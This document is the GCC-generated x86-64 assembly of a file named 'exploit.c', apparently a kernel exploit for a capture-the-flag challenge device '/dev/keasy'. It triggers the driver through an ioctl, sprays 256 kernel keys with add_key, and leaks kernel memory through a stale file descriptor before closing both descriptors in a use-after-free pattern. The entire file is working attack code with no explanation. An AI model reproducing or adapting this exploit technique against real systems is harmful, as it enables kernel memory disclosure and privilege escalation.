	.file	"exploit.c"
	.text
	.globl	fatal
	.type	fatal, @function
fatal:
.LFB6:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	movq	%rdi, -8(%rbp)
	movq	-8(%rbp), %rax
	movq	%rax, %rdi
	call	perror@PLT
	movl	$1, %edi
	call	exit@PLT
	.cfi_endproc
.LFE6:
	.size	fatal, .-fatal
	.globl	fd
	.bss
	.align 4
	.type	fd, @object
	.size	fd, 4
fd:
	.zero	4
	.globl	ezfd
	.data
	.align 4
	.type	ezfd, @object
	.size	ezfd, 4
ezfd:
	.long	-1
	.section	.rodata
.LC0:
	.string	"echo 123 > /jail/test"
.LC1:
	.string	"/dev/keasy"
.LC2:
	.string	"user"
.LC3:
	.string	"add_key"
.LC4:
	.string	"pwn go~"
.LC5:
	.string	"%ld\n"
.LC6:
	.string	"0x%016lx\n"
.LC7:
	.string	"freeing ezfd1"
.LC8:
	.string	"freeing fd"
	.text
	.globl	main
	.type	main, @function
main:
.LFB7:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$1056, %rsp
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	movl	$-1, -1044(%rbp)
	movq	$0, -784(%rbp)
	movq	$0, -776(%rbp)
	movq	$0, -768(%rbp)
	movq	$0, -760(%rbp)
	movq	$0, -752(%rbp)
	movq	$0, -744(%rbp)
	movq	$0, -736(%rbp)
	movq	$0, -728(%rbp)
	movq	$0, -720(%rbp)
	movq	$0, -712(%rbp)
	movq	$0, -704(%rbp)
	movq	$0, -696(%rbp)
	movq	$0, -688(%rbp)
	movq	$0, -680(%rbp)
	movq	$0, -672(%rbp)
	movq	$0, -664(%rbp)
	movq	$0, -656(%rbp)
	movq	$0, -648(%rbp)
	movq	$0, -640(%rbp)
	movq	$0, -632(%rbp)
	movq	$0, -624(%rbp)
	movq	$0, -616(%rbp)
	movq	$0, -608(%rbp)
	movq	$0, -600(%rbp)
	movq	$0, -592(%rbp)
	movq	$0, -584(%rbp)
	movq	$0, -576(%rbp)
	movq	$0, -568(%rbp)
	movq	$0, -560(%rbp)
	movq	$0, -552(%rbp)
	movq	$0, -544(%rbp)
	movq	$0, -536(%rbp)
	leaq	.LC0(%rip), %rax
	movq	%rax, %rdi
	call	system@PLT
	movl	$2, %esi
	leaq	.LC1(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	open@PLT
	movl	%eax, fd(%rip)
	movl	fd(%rip), %eax
	cmpl	$-1, %eax
	jne	.L3
	leaq	.LC1(%rip), %rax
	movq	%rax, %rdi
	call	fatal
.L3:
	movl	fd(%rip), %eax
	addl	$1, %eax
	movl	%eax, -1044(%rbp)
	movl	fd(%rip), %eax
	movl	$-559038737, %edx
	movl	$0, %esi
	movl	%eax, %edi
	movl	$0, %eax
	call	ioctl@PLT
	movl	$0, -1052(%rbp)
	jmp	.L4
.L5:
	movl	-1052(%rbp), %eax
	cltq
	leaq	-559087616(%rax), %rdx
	movl	-1052(%rbp), %eax
	cltq
	movq	%rdx, -1040(%rbp,%rax,8)
	addl	$1, -1052(%rbp)
.L4:
	cmpl	$31, -1052(%rbp)
	jle	.L5
	leaq	-528(%rbp), %rax
	movl	$256, %edx
	movl	$66, %esi
	movq	%rax, %rdi
	call	memset@PLT
	movl	$0, -1048(%rbp)
	jmp	.L6
.L8:
	leaq	-528(%rbp), %rdx
	leaq	-272(%rbp), %rax
	movl	$-2, %r8d
	movl	$256, %ecx
	movq	%rax, %rsi
	leaq	.LC2(%rip), %rax
	movq	%rax, %rdi
	call	add_key@PLT
	testl	%eax, %eax
	jns	.L7
	leaq	.LC3(%rip), %rax
	movq	%rax, %rdi
	call	fatal
.L7:
	addl	$1, -1048(%rbp)
.L6:
	cmpl	$255, -1048(%rbp)
	jle	.L8
	leaq	.LC4(%rip), %rax
	movq	%rax, %rdi
	call	puts@PLT
	leaq	-784(%rbp), %rcx
	movl	-1044(%rbp), %eax
	movl	$256, %edx
	movq	%rcx, %rsi
	movl	%eax, %edi
	call	read@PLT
	movq	%rax, %rsi
	leaq	.LC5(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	leaq	-784(%rbp), %rax
	movq	(%rax), %rax
	movq	%rax, %rsi
	leaq	.LC6(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	call	getchar@PLT
	leaq	.LC7(%rip), %rax
	movq	%rax, %rdi
	call	puts@PLT
	movl	-1044(%rbp), %eax
	movl	%eax, %edi
	call	close@PLT
	leaq	.LC8(%rip), %rax
	movq	%rax, %rdi
	call	puts@PLT
	movl	fd(%rip), %eax
	movl	%eax, %edi
	call	close@PLT
	movl	$0, %eax
	movq	-8(%rbp), %rdx
	subq	%fs:40, %rdx
	je	.L10
	call	__stack_chk_fail@PLT
.L10:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE7:
	.size	main, .-main
	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	1f - 0f
	.long	4f - 1f
	.long	5
0:
	.string	"GNU"
1:
	.align 8
	.long	0xc0000002
	.long	3f - 2f
2:
	.long	0x3
3:
	.align 8
4:
